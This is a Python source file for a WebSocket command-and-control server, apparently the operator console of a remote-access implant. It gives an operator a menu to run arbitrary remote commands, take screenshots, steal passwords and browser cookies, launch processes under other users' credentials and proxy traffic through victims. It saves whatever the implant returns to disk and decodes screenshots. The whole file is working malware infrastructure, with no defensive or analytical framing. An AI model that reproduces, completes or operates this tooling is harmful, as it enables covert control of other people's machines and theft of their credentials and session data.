import asyncio
import websockets
import json
import base64
from io import BytesIO
from PIL import Image
import os
import time
import sys
import logging

def save_dict_to_disk(data_dict):
    if not isinstance(data_dict, dict):
        raise ValueError("The provided data is not a dictionary.")

   
    current_time = time.strftime("%Y%m%d_%H%M%S")
    filename = f"output_{current_time}.json"
    file_path = os.path.join(os.getcwd(), filename)
    json_data = json.dumps(data_dict, indent=4)

    with open(file_path, "w") as file:
        file.write(json_data)
    
   
    print(f"Filename: {filename}")
    print(f"File saved at: {file_path}")


def render_image_from_json(json_data):
    
    base64_image = json_data["image"]
    if not base64_image:
        print("Image data not found in JSON.")
        return
    
    image_data = base64.b64decode(base64_image)
    image = Image.open(BytesIO(image_data))
    image.show()


async def process_message(message):
      if message["type"] == "0006":
         render_image_from_json(message)
        
      else:
        print(message)
        save_dict_to_disk(message)

async def handler(websocket, path):
    registration = await websocket.recv()
    print(f"Registration  message: {registration}")
    while True:
       
        print("\n Types")
        print("1. RCE")
        print("2. Take ScreenShot")
        print("3. Steal Password")
        print("4. Steal Cookies")
        print("5. Create Process as different user")
        print("6. Proxy Traffic")
        user_input = input("Select a Option (1/2/3/4/5/6): ")
        
        response_value = None
        if user_input == "1":
            cmd_execute = input("Please provide the command you want to execute : ")
            response_value = {"type":"0001","command":f"{cmd_execute}"}
        elif user_input == "2":
            response_value = {"type":"0002","command":"1"}
        elif user_input == "3":
            response_value = {"type":"000000","command":""}
        elif user_input == "4":
            response_value = {"type":"0009","command":""}
        elif user_input == "5":
            user_name = input("Please provide the username you want to login to : ")
            user_password = input("Please provide the password for the username : ")
            user_cmd = input("Please provide the command you want to execute : ")
            response_value = {"type":"0012","command":f"""{{"username": "{user_name}","password": "{user_password}","command": "{user_cmd}"}}"""}
        elif user_input == "6":
            response_value = {"type":"0003","command":"{\"listenerIP\": \"127.0.0.1\",\"listenerPort\": \"65432\"}"}
            print("Please check the output of the listener_socket script to see the proxied traffic")            
        else:
            print("Invalid selection. No response sent.")
            continue

       
        response_message = json.dumps(response_value)
        await websocket.send(response_message)
        print(f"Sent message: {response_message}")
        
        
        
        try:
            message = await asyncio.wait_for(websocket.recv(), timeout=15.0)
            print(f"Received message: {message}")
            message_json = json.loads(message)
            await process_message(message_json)
        except json.JSONDecodeError as e:
            print(f"Failed to decode JSON: {e}")
            continue
        except asyncio.TimeoutError:
            print("TimeoutError: No message recieved")
            continue
        except websockets.exceptions.ConnectionClosed as e:
            print("Connection closed ")
            break

        except websockets.exceptions.ConnectionClosedError as e:
            print("Connection closed ")
            break

        except ConnectionResetError as e:
            logging.error(f"Connection reset error: {e}")
            break

        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            break


        
        

async def main():
    
    async with websockets.serve(handler, "localhost", 8082):
        print("WebSocket server started on ws://localhost:8082")
        await asyncio.Future()  

if __name__ == "__main__":
    asyncio.run(main())



